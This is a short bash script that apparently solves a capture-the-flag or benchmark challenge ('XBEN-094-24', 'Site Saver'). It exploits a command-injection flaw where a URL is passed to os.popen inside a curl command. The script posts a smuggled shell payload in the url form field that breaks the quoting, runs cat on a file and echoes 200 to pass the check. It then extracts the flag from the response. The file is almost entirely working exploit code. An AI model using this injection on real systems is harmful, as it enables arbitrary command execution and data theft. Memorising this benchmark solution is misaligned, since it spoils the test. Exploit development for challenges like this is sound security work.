#!/usr/bin/env bash
# XBEN-094-24 — "Site Saver" (tags: command_injection)
#
# Before saving a URL the application checks it is reachable, by building
# `curl -o /dev/null -s -w "%{http_code}" "<url>"` as a string and handing it to
# `os.popen`. The URL is inside double quotes, which stops a space from
# splitting it and stops nothing else.
#
# The status it read back is then quoted into the response message, so the
# command's output comes back to the client — no blind channel needed. Ending
# the payload with `echo 200` also satisfies the `'200' in response` check, so
# the save reports success.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben094-$$"
FILE="${2:-flag.txt}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/add_url" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/add_url' \
    --set "form.url=\" ; cat $FILE ; echo 200 ; #" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
